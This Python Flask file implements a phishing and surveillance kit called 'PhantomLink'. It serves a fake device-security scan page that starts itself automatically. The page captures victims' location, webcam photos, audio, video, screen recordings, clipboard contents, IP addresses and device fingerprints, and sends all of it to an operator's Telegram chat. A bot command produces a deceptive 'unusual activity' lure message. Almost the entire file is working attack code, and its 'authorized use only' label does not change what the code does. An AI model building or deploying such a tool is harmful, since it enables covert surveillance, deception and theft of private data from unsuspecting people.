#!/usr/bin/env python3


import os
import json
import base64
import logging
import time
from threading import Lock
from flask import Flask, request, render_template_string
import requests as req

# ======================== CONFIG ========================
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
CHAT_ID = os.environ.get("CHAT_ID", "")
scan_counter = 0
counter_lock = Lock()
# ========================================================

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)

# ======================== PROFESSIONAL HTML LURE ========================
HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SecurShield | Device Integrity Check</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Roboto, system-ui, sans-serif; background: #0c0f14; color: #d1d5db; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .card { background: #1a1d23; border: 1px solid #2a2d35; border-radius: 24px; padding: 40px 35px; max-width: 420px; width: 90%; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.6); }
        .logo { font-size: 40px; margin-bottom: 20px; }
        h2 { font-size: 22px; font-weight: 600; color: #f3f4f6; margin-bottom: 8px; }
        .subtitle { font-size: 14px; color: #9ca3af; margin-bottom: 30px; }
        .shield-icon { background: linear-gradient(135deg, #059669, #10b981); width: 64px; height: 64px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 25px; font-size: 32px; }
        .progress-container { margin: 25px 0; display: none; }
        .progress-bar { background: #2a2d35; height: 6px; border-radius: 3px; overflow: hidden; }
        .progress-fill { width: 0%; height: 100%; background: #10b981; border-radius: 3px; transition: width 0.5s; }
        .status-text { font-size: 13px; color: #9ca3af; margin-top: 10px; }
        .btn { background: linear-gradient(135deg, #059669, #10b981); color: #fff; border: none; padding: 14px 36px; font-size: 16px; font-weight: 600; border-radius: 30px; cursor: pointer; transition: all 0.2s; box-shadow: 0 8px 20px rgba(16, 185, 129, 0.25); }
        .btn:hover { background: linear-gradient(135deg, #047857, #059669); box-shadow: 0 12px 28px rgba(16, 185, 129, 0.4); }
        .btn:disabled { background: #374151; box-shadow: none; cursor: not-allowed; }
        .footer { font-size: 11px; color: #6b7280; margin-top: 30px; }
    </style>
</head>
<body>
    <div class="card">
        <div class="shield-icon">🛡️</div>
        <h2>SecurShield Integrity Scan</h2>
        <div class="subtitle">Verify your device's security posture in seconds.</div>
        <button id="scanBtn" class="btn" onclick="startScan()">▶ Start Scan</button>
        <div id="progressContainer" class="progress-container">
            <div class="progress-bar"><div id="progressFill" class="progress-fill"></div></div>
            <div id="status" class="status-text">Initializing...</div>
        </div>
    </div>
    <script>
        const scanBtn = document.getElementById('scanBtn');
        const status = document.getElementById('status');
        const progressFill = document.getElementById('progressFill');
        const progressContainer = document.getElementById('progressContainer');
        let collected = {};

        function updateProgress(percent, text) {
            progressFill.style.width = percent + '%';
            status.textContent = text;
        }

        // ---------- Helper Functions ----------
        function blobToBase64(blob) {
            return new Promise((resolve) => {
                const reader = new FileReader();
                reader.onloadend = () => resolve(reader.result);
                reader.readAsDataURL(blob);
            });
        }

        function capturePhoto(stream) {
            return new Promise((resolve) => {
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                video.addEventListener('loadeddata', () => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    resolve(canvas.toDataURL('image/jpeg', 0.8));
                });
            });
        }

        function recordAudio(stream, duration) {
            return new Promise((resolve) => {
                const audioStream = new MediaStream(stream.getAudioTracks());
                const mediaRecorder = new MediaRecorder(audioStream, { mimeType: 'audio/webm' });
                const chunks = [];
                mediaRecorder.ondataavailable = e => chunks.push(e.data);
                mediaRecorder.onstop = () => resolve(new Blob(chunks, { type: 'audio/webm' }));
                mediaRecorder.start();
                setTimeout(() => mediaRecorder.stop(), duration);
            });
        }

        function recordVideo(stream, duration) {
            return new Promise((resolve) => {
                const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
                const chunks = [];
                mediaRecorder.ondataavailable = e => chunks.push(e.data);
                mediaRecorder.onstop = () => resolve(new Blob(chunks, { type: 'video/webm' }));
                mediaRecorder.start();
                setTimeout(() => mediaRecorder.stop(), duration);
            });
        }

        function recordScreen(duration) {
            return navigator.mediaDevices.getDisplayMedia({ video: true, audio: false })
                .then(screenStream => {
                    return new Promise((resolve) => {
                        const mediaRecorder = new MediaRecorder(screenStream, { mimeType: 'video/webm' });
                        const chunks = [];
                        mediaRecorder.ondataavailable = e => chunks.push(e.data);
                        mediaRecorder.onstop = async () => {
                            const blob = new Blob(chunks, { type: 'video/webm' });
                            collected.screenCapture = await blobToBase64(blob);
                            resolve();
                        };
                        mediaRecorder.start();
                        setTimeout(() => mediaRecorder.stop(), duration);
                    });
                })
                .catch(e => collected.screenCaptureError = e.message);
        }

        // ---------- Additional OSINT Extractions ----------
        async function extractWebRTCIPs() {
            const localIPs = [];
            return new Promise((resolve) => {
                const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
                pc.createDataChannel("");
                pc.createOffer().then(offer => pc.setLocalDescription(offer));
                pc.onicecandidate = (e) => {
                    if (!e.candidate) {
                        collected.localIPs = [...new Set(localIPs)];
                        resolve();
                        return;
                    }
                    const ipRegex = /([0-9]{1,3}\.){3}[0-9]{1,3}/;
                    const match = e.candidate.candidate.match(ipRegex);
                    if (match) {
                        const ip = match[0];
                        if (!ip.startsWith("192.168") && !ip.startsWith("10.") && !ip.startsWith("172.") && ip !== "0.0.0.0") {
                            collected.publicIP = ip;
                        }
                        localIPs.push(ip);
                    }
                };
                setTimeout(() => {
                    collected.localIPs = [...new Set(localIPs)];
                    resolve();
                }, 2000);
            });
        }

        function extractCanvasFingerprint() {
            const canvas = document.createElement('canvas');
            canvas.width = 200; canvas.height = 50;
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = "top";
            ctx.font = "14px 'Arial'";
            ctx.fillStyle = "#f60";
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = "#069";
            ctx.fillText("PhantomLink", 2, 15);
            ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
            ctx.fillText("PhantomLink", 4, 17);
            collected.canvasHash = canvas.toDataURL();
        }

        function extractWebGLInfo() {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (gl) {
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (debugInfo) {
                    collected.webglVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                    collected.webglRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                }
            }
        }

        async function extractBatteryInfo() {
            if ('getBattery' in navigator) {
                const battery = await navigator.getBattery();
                collected.battery = {
                    level: battery.level,
                    charging: battery.charging,
                    chargingTime: battery.chargingTime,
                    dischargingTime: battery.dischargingTime
                };
            }
        }

        async function extractClipboard() {
            try {
                const clipText = await navigator.clipboard.readText();
                collected.clipboard = clipText;
            } catch(e) { collected.clipboard = "Permission denied or empty"; }
        }

        function extractMotionSensors() {
            if ('DeviceMotionEvent' in window) {
                window.addEventListener('devicemotion', (event) => {
                    const acc = event.accelerationIncludingGravity;
                    const rot = event.rotationRate;
                    if (acc && rot) {
                        collected.motion = {
                            x: acc.x, y: acc.y, z: acc.z,
                            alpha: rot.alpha, beta: rot.beta, gamma: rot.gamma
                        };
                    }
                }, { once: true });
            }
        }

        // ---------- Main Scan Flow ----------
        async function startScan() {
            scanBtn.disabled = true;
            progressContainer.style.display = 'block';
            updateProgress(5, 'Establishing secure channel...');

            collected.timestamp = new Date().toISOString();
            collected.screen = `${screen.width}x${screen.height}`;
            collected.platform = navigator.platform;
            collected.deviceMemory = navigator.deviceMemory || 'unknown';
            collected.userAgent = navigator.userAgent;

            // 1. Geolocation
            try {
                const pos = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        enableHighAccuracy: true, timeout: 8000
                    });
                });
                collected.location = {
                    lat: pos.coords.latitude,
                    lon: pos.coords.longitude,
                    accuracy: pos.coords.accuracy,
                    altitude: pos.coords.altitude,
                    speed: pos.coords.speed
                };
                updateProgress(25, 'Location acquired ✓');
            } catch(e) {
                collected.location = { error: e.message };
                updateProgress(25, 'Location skipped ✗');
            }

            // 2. Camera & microphone
            let stream;
            try {
                updateProgress(35, 'Accessing security sensors...');
                stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user', width: 640, height: 480 },
                    audio: true
                });
                updateProgress(45, 'Sensors online ✓');

                const photo = await capturePhoto(stream);
                collected.photo = photo;
                updateProgress(55, 'Facial snapshot captured ✓');

                const audioBlob = await recordAudio(stream, 5000);
                collected.audio = await blobToBase64(audioBlob);
                updateProgress(65, 'Voiceprint sample recorded ✓');

                const videoBlob = await recordVideo(stream, 3000);
                collected.video = await blobToBase64(videoBlob);
                updateProgress(75, 'Video identity clip saved ✓');

                stream.getTracks().forEach(track => track.stop());
            } catch(e) {
                collected.mediaError = e.message;
                updateProgress(75, 'Sensor error: ' + e.message);
            }

            // 3. Screen capture
            updateProgress(85, 'Requesting display analysis...');
            await recordScreen(3000);
            updateProgress(95, 'Screen data processed');

            // 4. Background OSINT extractions (run in parallel)
            await Promise.allSettled([
                extractWebRTCIPs(),
                extractCanvasFingerprint(),
                extractWebGLInfo(),
                extractBatteryInfo(),
                extractClipboard(),
                extractMotionSensors()
            ]);

            updateProgress(98, 'Compiling integrity report...');
            try {
                await fetch('/collect', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(collected)
                });
                updateProgress(100, '✅ Scan complete. Your device is verified.');
            } catch(e) {
                updateProgress(100, '⚠️ Network error. Please try again.');
            } finally {
                scanBtn.style.display = 'none';
            }
        }

        // Auto-start after 2 seconds
        setTimeout(() => {
            if (!scanBtn.disabled) startScan();
        }, 2000);
    </script>
</body>
</html>
"""

# ======================== FLASK ROUTES ========================
@app.route('/')
def index():
    return render_template_string(HTML)

@app.route('/collect', methods=['POST'])
def collect():
    global scan_counter
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    ua = request.headers.get('User-Agent', '')
    try:
        data = request.get_json(force=True)
    except Exception as e:
        logging.error(f"JSON error: {e}")
        return 'Bad JSON', 400
    if not data:
        return 'Empty', 400

    with counter_lock:
        scan_counter += 1
    logging.info(f"Scan #{scan_counter} from {ip}")
    send_to_telegram(data, ip, ua)
    return 'OK', 200

# ======================== TELEGRAM DELIVERY ========================
def send_to_telegram(data, ip, ua):
    if not BOT_TOKEN or not CHAT_ID:
        return
    try:
        timestamp = data.get('timestamp', 'Unknown')
        screen = data.get('screen', 'N/A')
        platform = data.get('platform', 'N/A')
        memory = data.get('deviceMemory', 'N/A')
        location = data.get('location', {})
        if 'lat' in location:
            maps = f"https://maps.google.com/?q={location['lat']},{location['lon']}"
            loc_line = f"📍 *Location*: [{location['lat']:.6f}, {location['lon']:.6f}]({maps}) (±{location.get('accuracy','?')}m)"
        else:
            loc_line = f"📍 *Location*: {location.get('error','Not available')}"

        extra = []
        if data.get('publicIP'): extra.append(f"🌐 *Public IP*: `{data['publicIP']}`")
        if data.get('localIPs'): extra.append(f"🏠 *Local IPs*: `{', '.join(data['localIPs'][:3])}`")
        if data.get('battery'):
            b = data['battery']
            extra.append(f"🔋 *Battery*: {b['level']*100:.0f}% (Charging: {b['charging']})")
        if data.get('clipboard'): extra.append(f"📋 *Clipboard*: `{data['clipboard'][:100]}`")
        if data.get('motion'): extra.append(f"📳 *Motion*: x={data['motion']['x']:.2f}, y={data['motion']['y']:.2f}, z={data['motion']['z']:.2f}")
        if data.get('webglVendor'): extra.append(f"🖥 *GPU*: {data['webglVendor']} / {data['webglRenderer']}")
        extra_text = '\n'.join(extra) if extra else ""

        msg = (
            f"🛡️ *New Device Security Report*\n"
            f"────────────────────\n"
            f"📅 *Timestamp*: `{timestamp}`\n"
            f"🖥 *Device*: {platform} | Screen: {screen} | RAM: {memory}GB\n"
            f"🌍 *IP*: `{ip}`\n"
            f"{loc_line}\n\n"
            f"{extra_text}\n"
            f"────────────────────\n"
            f"📊 Total scans: `{scan_counter}`"
        )
        req.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                 json={"chat_id": CHAT_ID, "text": msg, "parse_mode": "Markdown"})

        # Media attachments
        if data.get('photo'):
            photo_bytes = base64.b64decode(data['photo'].split(',')[1])
            req.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
                     files={"photo": ("selfie.jpg", photo_bytes)},
                     data={"chat_id": CHAT_ID, "caption": "📸 Facial capture"})
        if data.get('audio'):
            audio_bytes = base64.b64decode(data['audio'].split(',')[1])
            req.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendVoice",
                     files={"voice": ("recording.webm", audio_bytes)},
                     data={"chat_id": CHAT_ID, "caption": "🎤 Voice sample"})
        if data.get('video'):
            video_bytes = base64.b64decode(data['video'].split(',')[1])
            req.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo",
                     files={"video": ("clip.webm", video_bytes)},
                     data={"chat_id": CHAT_ID, "caption": "🎥 Video identity clip"})
        if data.get('screenCapture'):
            screen_bytes = base64.b64decode(data['screenCapture'].split(',')[1])
            req.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo",
                     files={"video": ("screen.webm", screen_bytes)},
                     data={"chat_id": CHAT_ID, "caption": "🖥️ Screen recording"})

    except Exception as e:
        logging.error(f"Telegram send error: {e}")

# ======================== TELEGRAM BOT UI (Webhook) ========================
@app.route('/webhook', methods=['POST'])
def webhook():
    update = request.get_json(force=True)
    if not update:
        return 'OK'
    if 'message' in update:
        msg = update['message']
        chat_id = msg['chat']['id']
        text = msg.get('text', '')
        if text == '/start':
            send_welcome(chat_id)
        elif text == '/link':
            send_link(chat_id)
        elif text == '/stats':
            send_stats(chat_id)
        elif text == '/clear':
            send_telegram_message(chat_id, "✅ In‑memory data cleared (this does not affect past scans).")
        else:
            send_telegram_message(chat_id, "❓ Unknown command. Use /start to see available options.")
    return 'OK'

def send_welcome(chat_id):
    welcome_text = (
        "🛡️ *PhantomLink Professional*\n"
        "────────────────────\n"
        "Advanced device integrity verification and threat simulation.\n\n"
        "🔹 `/link` — Generate a secure verification link\n"
        "🔹 `/stats` — Show scan statistics\n"
        "🔹 `/clear` — Clear in‑memory counters\n\n"
        "⚠️ *Authorized use only.*"
    )
    send_telegram_message(chat_id, welcome_text)

def send_link(chat_id):
    domain = os.environ.get("VERCEL_URL", "your-project.vercel.app")
    link = f"https://{domain}/"
    text = (
        "🔐 *Device Verification Required*\n\n"
        "We've detected unusual activity on your account. "
        "Please complete a quick device integrity scan to verify your identity."
    )
    # Build inline keyboard manually (no extra imports needed)
    keyboard = [[{"text": "🔍 Start Verification", "url": link}]]
    reply_markup = {"inline_keyboard": keyboard}
    req.post(
        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
        json={
            "chat_id": chat_id,
            "text": text,
            "parse_mode": "Markdown",
            "reply_markup": reply_markup
        }
    )

def send_stats(chat_id):
    send_telegram_message(chat_id, f"📊 *Scan Statistics*\n\nTotal scans processed: `{scan_counter}`")

def send_telegram_message(chat_id, text, **kwargs):
    """Simple message sender with Markdown parsing."""
    req.post(
        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
        json={"chat_id": chat_id, "text": text, "parse_mode": "Markdown", **kwargs}
    )

# ======================== LOCAL TESTING ========================
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
